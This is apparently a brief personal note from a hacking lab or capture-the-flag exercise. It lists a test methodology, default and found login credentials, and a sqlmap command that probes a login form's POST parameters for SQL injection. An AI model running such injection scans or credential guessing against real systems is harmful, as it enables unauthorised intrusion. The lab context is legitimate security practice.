# BASIC INFO
```
export IP=10.10.255.243

```

# ESTABLISHING A METHODOLOGY

> 1.	Authorization
> 1.	Authentication
> 1.	Injection
> 1.	Client Side Controls
> 1.	Application Logic

# AUTHENTICATION

## WEAK CREADENTIALS

> **admin : admin**

```
/usr/bin/sqlmap -u http://10.10.255.243/users/login.php --method POST --data username=FUZZ&password=FUZZ -p username --dbs --dbms mysql --regexp "username/password combination" --level 2

```

## FOUND CREDENTIALS

> bryce : bryce